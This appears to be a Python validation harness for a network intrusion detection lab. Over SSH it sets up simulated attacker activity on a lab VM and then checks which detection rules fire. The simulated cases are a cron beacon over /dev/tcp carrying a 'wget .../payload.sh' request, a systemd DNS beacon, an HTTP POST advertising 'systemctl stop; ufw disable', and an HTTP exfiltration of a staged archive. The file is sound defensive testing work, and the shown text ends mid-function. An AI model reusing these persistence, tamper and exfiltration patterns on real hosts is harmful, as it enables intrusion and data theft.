from __future__ import annotations

import argparse
import json
import posixpath
import shlex
import sqlite3
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

SCRIPT_DIR = Path(__file__).resolve().parent
if str(SCRIPT_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPT_DIR))

from live_vm_attack_validation import (  # noqa: E402
    REPO_ROOT,
    _chown_result_dir,
    _collect_artifacts,
    _connect,
    _download_file,
    _generate_reports,
    _now_stamp,
    _quote_remote,
    _run_command,
    _start_http_login_server,
    _start_udp_sink,
    _start_runtime,
    _stop_process,
    _stop_runtime,
    _upload_file,
    lab_vm_password_default,
    lab_vm_username_default,
    require_lab_vm_credentials,
)


def _sync_sensor_runtime(sensor_ssh: Any, workspace: str, config_relpath: str, password: str) -> None:
    files_to_sync = [
        (
            REPO_ROOT / "src" / "NIDS" / "pipeline" / "parser.py",
            posixpath.join(workspace, "src", "NIDS", "pipeline", "parser.py"),
        ),
        (
            REPO_ROOT / "src" / "NIDS" / "pipeline" / "features.py",
            posixpath.join(workspace, "src", "NIDS", "pipeline", "features.py"),
        ),
        (
            REPO_ROOT / "src" / "NIDS" / "ingest" / "live.py",
            posixpath.join(workspace, "src", "NIDS", "ingest", "live.py"),
        ),
        (
            REPO_ROOT / "src" / "NIDS" / "detect" / "anomaly.py",
            posixpath.join(workspace, "src", "NIDS", "detect", "anomaly.py"),
        ),
        (
            REPO_ROOT / "src" / "NIDS" / "runtime.py",
            posixpath.join(workspace, "src", "NIDS", "runtime.py"),
        ),
        (
            REPO_ROOT / "src" / "NIDS" / "config.py",
            posixpath.join(workspace, "src", "NIDS", "config.py"),
        ),
        (
            REPO_ROOT / "config" / "nids.yml",
            posixpath.join(workspace, "config", "nids.yml"),
        ),
        (
            REPO_ROOT / "rules" / "rules.yml",
            posixpath.join(workspace, "rules", "rules.yml"),
        ),
        (
            REPO_ROOT / Path(config_relpath),
            posixpath.join(workspace, config_relpath.replace("\\", "/")),
        ),
    ]
    for local_path, remote_path in files_to_sync:
        _upload_file(sensor_ssh, local_path, remote_path, sudo_password=password)


def _prepare_remote_cron_http_case(
    target_ssh: Any,
    *,
    sensor_ip: str,
    http_port: int,
    run_name: str,
    repeat_count: int,
    repeat_delay_sec: float,
) -> dict[str, str]:
    remote_base = f"/home/nidslab/.nidslab_os_cases/{run_name}"
    script = f"""
import pathlib
import subprocess
import time

base = pathlib.Path({remote_base!r})
base.mkdir(parents=True, exist_ok=True)
script_path = base / "cron_http_beacon.sh"
log_path = base / "cron_http_beacon.log"
installed_crontab_path = base / "crontab_installed.txt"
cleanup_crontab_path = base / "crontab_after_cleanup.txt"
tool_path = base / "tool_used.txt"
marker = {('NIDS_OS_CASE_' + run_name)!r}
host = {sensor_ip!r}
port = {http_port}
tool = "bash-devtcp"
body = (
    "#!/usr/bin/env bash\\n"
    "set +e\\n"
    "exec 3<>/dev/tcp/" + host + "/" + str(port) + " || exit 0\\n"
    "printf 'GET /update?cmd=wget%%20http://198.51.100.10/payload.sh HTTP/1.1\\\\r\\\\nHost: " + host + "\\\\r\\\\nUser-Agent: wget/cron-beacon\\\\r\\\\nConnection: close\\\\r\\\\n\\\\r\\\\n' >&3\\n"
    "cat <&3 >>\\"" + str(log_path) + "\\" 2>&1 || true\\n"
    "exec 3<&-\\n"
    "exec 3>&-\\n"
)

script_path.write_text(body, encoding="utf-8")
script_path.chmod(0o755)
tool_path.write_text(tool + "\\n", encoding="utf-8")

existing = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
existing_lines = []
if existing.returncode == 0:
    existing_lines = [line for line in existing.stdout.splitlines() if marker not in line]

cron_line = f"* * * * * {{script_path}} # {{marker}}"
new_crontab = "\\n".join(existing_lines + [cron_line]) + "\\n"
subprocess.run(["crontab", "-"], input=new_crontab, text=True, check=True)
installed = subprocess.run(["crontab", "-l"], capture_output=True, text=True, check=True)
installed_crontab_path.write_text(installed.stdout, encoding="utf-8")

for _ in range(int({repeat_count})):
    subprocess.run([str(script_path)], check=False)
    time.sleep(max(0.0, float({repeat_delay_sec})))
"""
    _run_command(target_ssh, "mkdir -p " + _quote_remote(remote_base), timeout=60)
    _run_command(target_ssh, "python3 - <<'PY'\n" + script + "\nPY", timeout=180)
    return {
        "case_type": "cron-http",
        "remote_base": remote_base,
        "script_path": f"{remote_base}/cron_http_beacon.sh",
        "log_path": f"{remote_base}/cron_http_beacon.log",
        "installed_crontab_path": f"{remote_base}/crontab_installed.txt",
        "cleanup_crontab_path": f"{remote_base}/crontab_after_cleanup.txt",
        "tool_path": f"{remote_base}/tool_used.txt",
        "marker": f"NIDS_OS_CASE_{run_name}",
    }


def _cleanup_remote_cron_http_case(target_ssh: Any, *, remote_base: str, marker: str) -> None:
    script = f"""
import pathlib
import subprocess

base = pathlib.Path({remote_base!r})
cleanup_crontab_path = base / "crontab_after_cleanup.txt"
marker = {marker!r}
existing = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
kept_lines = []
if existing.returncode == 0:
    kept_lines = [line for line in existing.stdout.splitlines() if marker not in line]

final_crontab = "\\n".join(kept_lines).rstrip()
if final_crontab:
    subprocess.run(["crontab", "-"], input=final_crontab + "\\n", text=True, check=True)
else:
    subprocess.run(["crontab", "-r"], check=False)

after = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
cleanup_crontab_path.write_text(after.stdout if after.returncode == 0 else "", encoding="utf-8")
"""
    _run_command(target_ssh, "python3 - <<'PY'\n" + script + "\nPY", timeout=120)


def _prepare_remote_systemd_dns_case(
    target_ssh: Any,
    *,
    sensor_ip: str,
    run_name: str,
    dns_count: int,
    dns_delay_sec: float,
    sudo_password: str,
) -> dict[str, str]:
    remote_base = f"/home/nidslab/.nidslab_os_cases/{run_name}"
    service_name = f"nids-os-{run_name}.service"
    service_unit_remote = f"{remote_base}/{service_name}"
    service_unit_system = f"/etc/systemd/system/{service_name}"
    script = f"""
import pathlib

base = pathlib.Path({remote_base!r})
base.mkdir(parents=True, exist_ok=True)
script_path = base / "systemd_dns_beacon.py"
service_path = base / {service_name!r}
log_path = base / "systemd_dns_beacon.log"
install_state_path = base / "systemd_install_state.txt"
cleanup_state_path = base / "systemd_cleanup_state.txt"
service_status_path = base / "systemd_service_status.txt"
journal_path = base / "systemd_service_journal.txt"

python_body = (
    "import socket\\n"
    "import struct\\n"
    "import time\\n"
    "from pathlib import Path\\n"
    f"log_path = Path({str(remote_base + '/systemd_dns_beacon.log')!r})\\n"
    f"server = ({sensor_ip!r}, 53)\\n"
    "sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\\n"
    "def encode_name(name):\\n"
    "    return b''.join(bytes([len(part)]) + part.encode('ascii') for part in name.split('.')) + b'\\\\x00'\\n"
    f"count = int({dns_count})\\n"
    f"delay_sec = float({dns_delay_sec})\\n"
    "for index in range(count):\\n"
    "    qname = f'{{index:03d}}.systemd-beacon.example'\\n"
    "    txid = (30000 + index) & 0xFFFF\\n"
    "    header = struct.pack('!HHHHHH', txid, 0x0100, 1, 0, 0, 0)\\n"
    "    question = encode_name(qname) + struct.pack('!HH', 1, 1)\\n"
    "    sock.sendto(header + question, server)\\n"
    "    with log_path.open('a', encoding='utf-8') as handle:\\n"
    "        handle.write(qname + '\\\\n')\\n"
    "    time.sleep(max(0.0, delay_sec))\\n"
    "sock.close()\\n"
)
script_path.write_text(python_body, encoding="utf-8")
script_path.chmod(0o755)

service_body = (
    "[Unit]\\n"
    "Description=NIDS TestLab systemd DNS beacon\\n"
    "After=network-online.target\\n"
    "Wants=network-online.target\\n\\n"
    "[Service]\\n"
    "Type=oneshot\\n"
    "RemainAfterExit=yes\\n"
    "ExecStart=/usr/bin/python3 " + str(script_path) + "\\n\\n"
    "[Install]\\n"
    "WantedBy=multi-user.target\\n"
)
service_path.write_text(service_body, encoding="utf-8")
"""
    _run_command(target_ssh, "mkdir -p " + _quote_remote(remote_base), timeout=60)
    _run_command(target_ssh, "python3 - <<'PY'\n" + script + "\nPY", timeout=180)
    _run_command(
        target_ssh,
        f"sudo -S cp {_quote_remote(service_unit_remote)} {_quote_remote(service_unit_system)}",
        sudo_password=sudo_password,
        timeout=60,
    )
    _run_command(
        target_ssh,
        "sudo -S systemctl daemon-reload",
        sudo_password=sudo_password,
        timeout=60,
    )
    _run_command(
        target_ssh,
        f"sudo -S systemctl enable {service_name}",
        sudo_password=sudo_password,
        timeout=60,
        check=False,
    )
    _run_command(
        target_ssh,
        f"sudo -S systemctl start {service_name}",
        sudo_password=sudo_password,
        timeout=120,
    )
    _run_command(
        target_ssh,
        f"sudo -S bash -lc \"systemctl is-enabled {service_name} > {_quote_remote(remote_base + '/systemd_install_state.txt')} 2>&1 || true\"",
        sudo_password=sudo_password,
        timeout=60,
    )
    _run_command(
        target_ssh,
        f"sudo -S bash -lc \"systemctl status --no-pager {service_name} > {_quote_remote(remote_base + '/systemd_service_status.txt')} 2>&1 || true\"",
        sudo_password=sudo_password,
        timeout=60,
    )
    _run_command(
        target_ssh,
        f"sudo -S bash -lc \"journalctl -u {service_name} --no-pager -n 100 > {_quote_remote(remote_base + '/systemd_service_journal.txt')} 2>&1 || true\"",
        sudo_password=sudo_password,
        timeout=60,
    )
    return {
        "case_type": "systemd-dns",
        "remote_base": remote_base,
        "service_name": service_name,
        "service_unit_remote_path": service_unit_remote,
        "service_unit_system": service_unit_system,
        "script_path": f"{remote_base}/systemd_dns_beacon.py",
        "log_path": f"{remote_base}/systemd_dns_beacon.log",
        "install_state_path": f"{remote_base}/systemd_install_state.txt",
        "service_status_path": f"{remote_base}/systemd_service_status.txt",
        "journal_path": f"{remote_base}/systemd_service_journal.txt",
        "cleanup_state_path": f"{remote_base}/systemd_cleanup_state.txt",
    }


def _cleanup_remote_systemd_dns_case(
    target_ssh: Any,
    *,
    remote_base: str,
    service_name: str,
    service_unit_system_path: str,
    sudo_password: str,
) -> None:
    _run_command(
        target_ssh,
        f"sudo -S systemctl disable --now {service_name}",
        sudo_password=sudo_password,
        timeout=120,
        check=False,
    )
    _run_command(
        target_ssh,
        f"sudo -S rm -f {_quote_remote(service_unit_system_path)}",
        sudo_password=sudo_password,
        timeout=60,
        check=False,
    )
    _run_command(
        target_ssh,
        "sudo -S systemctl daemon-reload",
        sudo_password=sudo_password,
        timeout=60,
        check=False,
    )
    _run_command(
        target_ssh,
        f"sudo -S bash -lc \"systemctl is-enabled {service_name} > {_quote_remote(remote_base + '/systemd_cleanup_state.txt')} 2>&1 || true\"",
        sudo_password=sudo_password,
        timeout=60,
        check=False,
    )


def _prepare_remote_defense_tamper_case(
    target_ssh: Any,
    *,
    sensor_ip: str,
    http_port: int,
    run_name: str,
    repeat_count: int,
    repeat_delay_sec: float,
    sudo_password: str,
) -> dict[str, str]:
    remote_base = f"/home/nidslab/.nidslab_os_cases/{run_name}"
    service_name = f"nids-defense-guard-{run_name}.service"
    service_unit_remote = f"{remote_base}/{service_name}"
    service_unit_system = f"/etc/systemd/system/{service_name}"
    attack_script_path = f"{remote_base}/defense_tamper_attack.py"
    service_status_before_path = f"{remote_base}/guard_service_status_before.txt"
    service_status_after_stop_path = f"{remote_base}/guard_service_status_after_stop.txt"
    service_stop_attempt_path = f"{remote_base}/guard_service_stop_attempt.txt"
    firewall_status_before_path = f"{remote_base}/firewall_status_before.txt"
    firewall_disable_simulation_path = f"{remote_base}/firewall_disable_simulation.txt"
    cleanup_state_path = f"{remote_base}/defense_tamper_cleanup_state.txt"
    tamper_plan_path = f"{remote_base}/tamper_plan.txt"
    attack_log_path = f"{remote_base}/defense_tamper_attack.log"
    attack_body = (
        f"action=defense_tamper&command=sudo systemctl stop {service_name}; sudo ufw disable; "
        "note=simulated firewall tamper with explicit service-stop intent"
    )
    attack_script_body = "\n".join(
        [
            "import socket",
            "import time",
            "from pathlib import Path",
            f"sensor = ({sensor_ip!r}, {int(http_port)})",
            f"body = {attack_body!r}.encode('utf-8')",
            "request = (",
            f"    b'POST /ops/maintenance HTTP/1.1\\r\\nHost: {sensor_ip}\\r\\n'",
            "    b'User-Agent: ubuntu-defense-tamper\\r\\n'",
            "    b'Content-Type: application/x-www-form-urlencoded\\r\\n'",
            "    + f'Content-Length: {len(body)}\\r\\nConnection: close\\r\\n\\r\\n'.encode('utf-8')",
            "    + body",
            ")",
            f"log_path = Path({attack_log_path!r})",
            f"for index in range({int(repeat_count)}):",
            "    try:",
            "        sock = socket.create_connection(sensor, timeout=3.0)",
            "        sock.settimeout(2.0)",
            "        sock.sendall(request)",
            "        try:",
            "            response = sock.recv(256)",
            "        except Exception:",
            "            response = b''",
            "        finally:",
            "            sock.close()",
            "        with log_path.open('a', encoding='utf-8') as handle:",
            "            handle.write(f'sent_http_tamper_post_{index}: {len(response)} bytes response\\n')",
            "    except Exception as exc:",
            "        with log_path.open('a', encoding='utf-8') as handle:",
            "            handle.write(f'sent_http_tamper_post_{index}: error={exc}\\n')",
            f"    time.sleep({float(repeat_delay_sec)})",
            "",
        ]
    )
    tamper_plan_text = (
        f"Attack intent: simulate Linux defense tamper by advertising `sudo systemctl stop {service_name}` "
        "and `sudo ufw disable` over HTTP while stopping only a temporary guard service on the target for safe evidence capture.\n"
    )

    script = f"""
import pathlib

base = pathlib.Path({remote_base!r})
base.mkdir(parents=True, exist_ok=True)
service_path = base / {service_name!r}
attack_script = base / "defense_tamper_attack.py"
plan_path = base / "tamper_plan.txt"
log_path = base / "defense_tamper_attack.log"

service_body = (
    "[Unit]\\n"
    "Description=NIDS TestLab defense guard service\\n"
    "After=network-online.target\\n\\n"
    "[Service]\\n"
    "Type=simple\\n"
    "ExecStart=/bin/sh -c 'while true; do sleep 300; done'\\n"
    "Restart=no\\n\\n"
    "[Install]\\n"
    "WantedBy=multi-user.target\\n"
)
service_path.write_text(service_body, encoding="utf-8")
attack_script.write_text({attack_script_body!r}, encoding="utf-8")
plan_path.write_text({tamper_plan_text!r}, encoding="utf-8")
"""
    _run_command(target_ssh, "mkdir -p " + _quote_remote(remote_base), timeout=60)
    _run_command(target_ssh, "python3 - <<'PY'\n" + script + "\nPY", timeout=180)
    _run_command(
        target_ssh,
        f"sudo -S cp {_quote_remote(service_unit_remote)} {_quote_remote(service_unit_system)}",
        sudo_password=sudo_password,
        timeout=60,
    )
    _run_command(
        target_ssh,
        "sudo -S systemctl daemon-reload",
        sudo_password=sudo_password,
        timeout=60,
    )
    _run_command(
        target_ssh,
        f"sudo -S systemctl enable {service_name}",
        sudo_password=sudo_password,
        timeout=60,
        check=False,
    )
    _run_command(
        target_ssh,
        f"sudo -S systemctl start {service_name}",
        sudo_password=sudo_password,
        timeout=120,
    )
    _run_command(
        target_ssh,
        f"sudo -S bash -lc \"systemctl status --no-pager {service_name} > {_quote_remote(service_status_before_path)} 2>&1 || true\"",
        sudo_password=sudo_password,
        timeout=60,
    )
    _run_command(
        target_ssh,
        (
            "bash -lc "
            + shlex.quote(
                f"if command -v ufw >/dev/null 2>&1; then ufw status verbose > {shlex.quote(firewall_status_before_path)} 2>&1; "
                f"else echo 'ufw_not_installed_or_not_available' > {shlex.quote(firewall_status_before_path)}; fi"
            )
        ),
        timeout=60,
        check=False,
    )
    return {
        "case_type": "defense-tamper",
        "remote_base": remote_base,
        "service_name": service_name,
        "service_unit_remote_path": service_unit_remote,
        "service_unit_system": service_unit_system,
        "attack_script_path": attack_script_path,
        "tamper_plan_path": tamper_plan_path,
        "attack_log_path": attack_log_path,
        "service_status_before_path": service_status_before_path,
        "service_status_after_stop_path": service_status_after_stop_path,
        "service_stop_attempt_path": service_stop_attempt_path,
        "firewall_status_before_path": firewall_status_before_path,
        "firewall_disable_simulation_path": firewall_disable_simulation_path,
        "cleanup_state_path": cleanup_state_path,
    }


def _execute_remote_defense_tamper_case(
    target_ssh: Any,
    *,
    remote_base: str,
    service_name: str,
    attack_script_path: str,
    service_status_after_stop_path: str,
    service_stop_attempt_path: str,
    firewall_disable_simulation_path: str,
    sudo_password: str,
) -> None:
    _run_command(target_ssh, f"python3 {_quote_remote(attack_script_path)}", timeout=180)
    _run_command(
        target_ssh,
        (
            "bash -lc "
            + shlex.quote(
                f"echo 'Simulated firewall tamper for safety. Intended command: sudo ufw disable' > {shlex.quote(firewall_disable_simulation_path)}"
            )
        ),
        timeout=60,
    )
    _run_command(
        target_ssh,
        f"sudo -S bash -lc \"systemctl stop {service_name} > {_quote_remote(service_stop_attempt_path)} 2>&1 || true\"",
        sudo_password=sudo_password,
        timeout=120,
        check=False,
    )
    _run_command(
        target_ssh,
        f"sudo -S bash -lc \"systemctl status --no-pager {service_name} > {_quote_remote(service_status_after_stop_path)} 2>&1 || true\"",
        sudo_password=sudo_password,
        timeout=60,
        check=False,
    )


def _cleanup_remote_defense_tamper_case(
    target_ssh: Any,
    *,
    remote_base: str,
    service_name: str,
    service_unit_system_path: str,
    sudo_password: str,
) -> None:
    _run_command(
        target_ssh,
        f"sudo -S systemctl disable --now {service_name}",
        sudo_password=sudo_password,
        timeout=120,
        check=False,
    )
    _run_command(
        target_ssh,
        f"sudo -S rm -f {_quote_remote(service_unit_system_path)}",
        sudo_password=sudo_password,
        timeout=60,
        check=False,
    )
    _run_command(
        target_ssh,
        "sudo -S systemctl daemon-reload",
        sudo_password=sudo_password,
        timeout=60,
        check=False,
    )
    _run_command(
        target_ssh,
        f"sudo -S bash -lc \"systemctl is-enabled {service_name} > {_quote_remote(remote_base + '/defense_tamper_cleanup_state.txt')} 2>&1 || true\"",
        sudo_password=sudo_password,
        timeout=60,
        check=False,
    )


def _collect_remote_vm_hardening_snapshot(
    target_ssh: Any,
    *,
    remote_base: str,
    sudo_password: str,
) -> dict[str, str]:
    artifacts = {
        "os_release_path": f"{remote_base}/os_release.txt",
        "ssh_hardening_path": f"{remote_base}/ssh_hardening_snapshot.txt",
        "ufw_status_path": f"{remote_base}/ufw_status_snapshot.txt",
        "listening_sockets_path": f"{remote_base}/listening_sockets_snapshot.txt",
        "enabled_services_path": f"{remote_base}/enabled_services_snapshot.txt",
    }
    _run_command(
        target_ssh,
        f"bash -lc \"cat /etc/os-release > {_quote_remote(artifacts['os_release_path'])} 2>&1 || true\"",
        timeout=60,
        check=False,
    )
    _run_command(
        target_ssh,
        f"sudo -S bash -lc \"grep -E '^(PermitRootLogin|PasswordAuthentication|KbdInteractiveAuthentication|PubkeyAuthentication)' /etc/ssh/sshd_config > {_quote_remote(artifacts['ssh_hardening_path'])} 2>&1 || true\"",
        sudo_password=sudo_password,
        timeout=60,
        check=False,
    )
    _run_command(
        target_ssh,
        f"sudo -S bash -lc \"if command -v ufw >/dev/null 2>&1; then ufw status verbose > {_quote_remote(artifacts['ufw_status_path'])} 2>&1 || true; else echo 'ufw_not_installed_or_not_available' > {_quote_remote(artifacts['ufw_status_path'])}; fi\"",
        sudo_password=sudo_password,
        timeout=60,
        check=False,
    )
    _run_command(
        target_ssh,
        f"sudo -S bash -lc \"ss -lntup > {_quote_remote(artifacts['listening_sockets_path'])} 2>&1 || true\"",
        sudo_password=sudo_password,
        timeout=60,
        check=False,
    )
    _run_command(
        target_ssh,
        f"sudo -S bash -lc \"systemctl list-unit-files --type=service --state=enabled > {_quote_remote(artifacts['enabled_services_path'])} 2>&1 || true\"",
        sudo_password=sudo_password,
        timeout=60,
        check=False,
    )
    return artifacts


def _prepare_remote_http_exfil_case(
    target_ssh: Any,
    *,
    sensor_ip: str,
    http_port: int,
    run_name: str,
    repeat_count: int,
    repeat_delay_sec: float,
) -> dict[str, str]:
    remote_base = f"/home/nidslab/.nidslab_os_cases/{run_name}"
    staged_dir = f"{remote_base}/staged_loot"
    manifest_path = f"{remote_base}/staged_loot_manifest.txt"
    archive_path = f"{remote_base}/staged_loot.tar.gz"
    attack_script_path = f"{remote_base}/staged_http_exfil.py"
    attack_log_path = f"{remote_base}/staged_http_exfil.log"
    cleanup_note_path = f"{remote_base}/staged_http_exfil_cleanup.txt"
    file_count = 3
    file_size_bytes = 16384
    exfil_sender_body = "\n".join(
        [
            "import socket",
            "import time",
            "from pathlib import Path",
            f"archive_path = Path({archive_path!r})",
            f"log_path = Path({attack_log_path!r})",
            "archive_bytes = archive_path.read_bytes()",
            "headers = (",
            "    'POST /upload/archive-exfil HTTP/1.1\\r\\n'",
            f"    'Host: {sensor_ip}\\r\\n'",
            "    'User-Agent: ubuntu-http-exfil\\r\\n'",
            "    'Content-Type: application/octet-stream\\r\\n'",
            "    'Content-Disposition: attachment; filename=staged_loot.tar.gz\\r\\n'",
            "    'X-Exfil-Intent: staged-archive\\r\\n'",
            "    + f'Content-Length: {len(archive_bytes)}\\r\\nConnection: close\\r\\n\\r\\n'",
            ").encode('utf-8')",
            "request = headers + archive_bytes",
            f"for index in range({int(repeat_count)}):",
            "    try:",
            f"        sock = socket.create_connection(({sensor_ip!r}, {int(http_port)}), timeout=4.0)",
            "        sock.settimeout(2.0)",
            "        sock.sendall(request)",
            "        try:",
            "            response = sock.recv(256)",
            "        except Exception:",
            "            response = b''",
            "        finally:",
            "            sock.close()",
            "        with log_path.open('a', encoding='utf-8') as handle:",
            "            handle.write(f'sent_http_exfil_post_{index}: archive_bytes={len(archive_bytes)} response_bytes={len(response)}\\n')",
            "    except Exception as exc:",
            "        with log_path.open('a', encoding='utf-8') as handle:",
            "            handle.write(f'sent_http_exfil_post_{index}: error={exc}\\n')",
            f"    time.sleep({float(repeat_delay_sec)})",
            "",
        ]
    )
    attack_script = f"""
import tarfile
from pathlib import Path

base = Path({remote_base!r})
staged_dir = Path({staged_dir!r})
staged_dir.mkdir(parents=True, exist_ok=True)
manifest_path = Path({manifest_path!r})
archive_path = Path({archive_path!r})
attack_script_path = Path({attack_script_path!r})

manifest_lines = []
for index in range({file_count}):
    payload = ("record-" + str(index) + "\\n") + ("A" * {file_size_bytes})
    file_path = staged_dir / f"loot_{{index}}.txt"
    file_path.write_text(payload, encoding="utf-8")
    manifest_lines.append(f"{{file_path.name}}|{{file_path.stat().st_size}}")
manifest_path.write_text("\\n".join(manifest_lines) + "\\n", encoding="utf-8")

with tarfile.open(archive_path, "w:gz") as archive:
    for file_path in sorted(staged_dir.iterdir()):
        archive.add(file_path, arcname=file_path.name)

attack_script_path.write_text({exfil_sender_body!r}, encoding="utf-8")
"""
    _run_command(target_ssh, "mkdir -p " + _quote_remote(remote_base), timeout=60)
    _run_command(target_ssh, "python3 - <<'PY'\n" + attack_script + "\nPY", timeout=300)
    return {
        "case_type": "staged-http-exfil",
        "remote_base": remote_base,
        "staged_dir_path": staged_dir,
        "manifest_path": manifest_path,
        "archive_path": archive_path,
        "attack_script_path": attack_script_path,
        "attack_log_path": attack_log_path,
        "cleanup_note_path": cleanup_note_path,
        "attack_file_count": str(file_count),
        "attack_file_size_bytes": str(file_size_bytes),
    }


def _execute_remote_http_exfil_case(
    target_ssh: Any,
    *,
    attack_script_path: str,
) -> None:
    _run_command(target_ssh, f"python3 {_quote_remote(attack_script_path)}", timeout=300)


def _cleanup_remote_http_exfil_case(
    target_ssh: Any,
    *,
    remote_base: str,
) -> None:
    _run_command(
        target_ssh,
        f"bash -lc \"echo 'Staged exfil artifacts retained under {remote_base} for evidence collection.' > {_quote_remote(remote_base + '/staged_http_exfil_cleanup.txt')}\"",
        timeout=60,
        check=False,
    )


def _download_remote_artifacts(target_ssh: Any, remote_paths: dict[str, str], local_dir: Path) -> None:
    local_dir.mkdir(parents=True, exist_ok=True)
    for key, remote_path in remote_paths.items():
        if not key.endswith("_path"):
            continue
        local_path = local_dir / Path(remote_path).name
        try:
            _download_file(target_ssh, remote_path, local_path)
        except (FileNotFoundError, OSError):
            continue


def _write_vm_hardening_report(
    local_result_dir: Path,
    *,
    remote_artifacts: dict[str, str],
    hardening_titles: list[tuple[str, str]],
    attack_strength: str,
    attack_profile: str,
) -> Path:
    report_path = local_result_dir / "vm_hardening_profile.md"
    lab_summary_path = REPO_ROOT / "NIDS_TestLab" / "realistic_lab_summary.json"
    security_posture: list[str] = []
    network_mode = "unknown"
    if lab_summary_path.exists():
        lab_summary = json.loads(lab_summary_path.read_text(encoding="utf-8-sig"))
        security_posture = [str(item) for item in lab_summary.get("security_posture") or []]
        network_mode = str(((lab_summary.get("realistic_lab") or {}).get("network") or {}).get("mode") or "unknown")

    lines = [
        "# VM Hardening and Attack Profile",
        "",
        "## VM Hardening Posture",
        "",
        f"- Lab network mode: `{network_mode}`",
        "- Sensor and target are separated into distinct VMs inside the isolated lab.",
        *[f"- {item}" for item in security_posture],
        "",
        "## Target Hardening Snapshots",
        "",
    ]
    for title, artifact_key in hardening_titles:
        artifact_path = remote_artifacts.get(artifact_key)
        if artifact_path:
            lines.append(
                f"- {title}: ["
                f"{Path(artifact_path).name}"
                f"]({(local_result_dir / 'target_host_artifacts' / Path(artifact_path).name).as_posix()})"
            )
    ssh_snapshot = local_result_dir / "target_host_artifacts" / Path(remote_artifacts.get("ssh_hardening_path", "")).name
    ufw_snapshot = local_result_dir / "target_host_artifacts" / Path(remote_artifacts.get("ufw_status_path", "")).name
    if ssh_snapshot.exists() or ufw_snapshot.exists():
        lines.extend(
            [
                "",
                "## Observed Hardening Excerpts",
                "",
            ]
        )
    if ssh_snapshot.exists():
        ssh_excerpt = "; ".join(
            line.strip()
            for line in ssh_snapshot.read_text(encoding="utf-8", errors="ignore").splitlines()
            if line.strip()
        ) or "no explicit SSH hardening lines captured"
        lines.append(f"- SSH snapshot excerpt: `{ssh_excerpt}`")
    if ufw_snapshot.exists():
        ufw_excerpt = "; ".join(
            line.strip()
            for line in ufw_snapshot.read_text(encoding="utf-8", errors="ignore").splitlines()
            if line.strip()
        ) or "no firewall status captured"
        lines.append(f"- Firewall snapshot excerpt: `{ufw_excerpt}`")
    lines.extend(
        [
            "",
            "## Attack Strength",
            "",
            f"- Level: `{attack_strength}`",
            f"- Profile: {attack_profile}",
            "",
        ]
    )
    report_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return report_path


def _write_os_summary(
    local_result_dir: Path,
    *,
    attack_theme: str,
    attack_case: str,
    target_vm: str,
    defense_control: str,
    nids_expected_rules: list[str],
    remote_artifacts: dict[str, str],
    artifact_titles: list[tuple[str, str]],
    hardening_titles: list[tuple[str, str]],
    attack_strength: str,
    attack_profile: str,
    fix_if_missed: str,
) -> tuple[Path, Path]:
    db_path = local_result_dir / "nids.db"
    if not db_path.exists():
        raise FileNotFoundError(f"Result DB not found at {db_path}")

    conn = sqlite3.connect(db_path)
    try:
        total_alerts = int(conn.execute("SELECT COUNT(*) FROM alerts").fetchone()[0])
        total_flows = int(conn.execute("SELECT COUNT(*) FROM flows").fetchone()[0])
        observed_alerts = [
            {"rule_name": str(rule_name), "count": int(count)}
            for rule_name, count in conn.execute(
                """
                SELECT COALESCE(rule_name, ''), COUNT(*)
                FROM alerts
                GROUP BY COALESCE(rule_name, '')
                """
            ).fetchall()
            if str(rule_name).strip()
        ]
    finally:
        conn.close()

    matched_rules = [item for item in observed_alerts if item["rule_name"] in set(nids_expected_rules)]
    status = "pass" if matched_rules else "miss"

    summary = {
        "generated_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "os_family": "ubuntu-linux",
        "target_vm": target_vm,
        "attack_theme": attack_theme,
        "attack_case": attack_case,
        "defense_control": defense_control,
        "nids_expected_rules": nids_expected_rules,
        "observed_alerts": observed_alerts,
        "matched_rules": matched_rules,
        "status": status,
        "total_flows": total_flows,
        "total_alerts": total_alerts,
        "attack_strength": attack_strength,
        "attack_profile": attack_profile,
        "target_artifacts": {key: str((local_result_dir / "target_host_artifacts" / Path(path).name)) for key, path in remote_artifacts.items() if key.endswith("_path")},
        "defense_artifacts": {
            name: str(local_result_dir / filename)
            for name, filename in [
                ("nids_db", "nids.db"),
                ("alerts_jsonl", "alerts.jsonl"),
                ("flows_jsonl", "flows.jsonl"),
                ("incident_report", "serious_test_report.md"),
                ("threshold_report", "threshold_tuning.md"),
                ("vm_hardening_report", "vm_hardening_profile.md"),
            ]
            if (local_result_dir / filename).exists()
        },
        "fix_if_missed": fix_if_missed,
    }

    json_path = local_result_dir / "os_defense_summary.json"
    md_path = local_result_dir / "os_defense_summary.md"
    json_path.write_text(json.dumps(summary, indent=2), encoding="utf-8")

    lines = [
        "# Ubuntu OS Defense Validation Summary",
        "",
        f"- Run: `{local_result_dir.name}`",
        "- OS family: `ubuntu-linux`",
        f"- Target VM: `{target_vm}`",
        f"- Attack theme: `{attack_theme}`",
        f"- Attack case: `{attack_case}`",
        f"- Defense control: `{defense_control}`",
        f"- Attack strength: `{attack_strength}`",
        f"- Status: `{status}`",
        f"- Total flows: `{total_flows}`",
        f"- Total alerts: `{total_alerts}`",
        "",
        "## Attack Profile",
        "",
        f"- {attack_profile}",
        "",
        "## Expected NIDS Rules",
        "",
        *[f"- `{rule}`" for rule in nids_expected_rules],
        "",
        "## Matched Rules",
        "",
    ]
    if matched_rules:
        lines.extend(f"- `{item['rule_name']}` x{item['count']}" for item in matched_rules)
    else:
        lines.append("- none")

    lines.extend(
        [
            "",
            "## VM Hardening Evidence",
            "",
        ]
    )
    for title, artifact_key in hardening_titles:
        artifact_path = remote_artifacts.get(artifact_key)
        if artifact_path:
            lines.append(
                f"- {title}: ["
                f"{Path(artifact_path).name}"
                f"]({(local_result_dir / 'target_host_artifacts' / Path(artifact_path).name).as_posix()})"
            )
    vm_hardening_report = local_result_dir / "vm_hardening_profile.md"
    if vm_hardening_report.exists():
        lines.append(f"- Consolidated hardening report: [{vm_hardening_report.name}]({vm_hardening_report.as_posix()})")

    lines.extend(
        [
            "",
            "## Attack-Side Host Evidence",
            "",
        ]
    )
    for title, artifact_key in artifact_titles:
        artifact_path = remote_artifacts.get(artifact_key)
        if not artifact_path:
            continue
        lines.append(
            f"- {title}: ["
            f"{Path(artifact_path).name}"
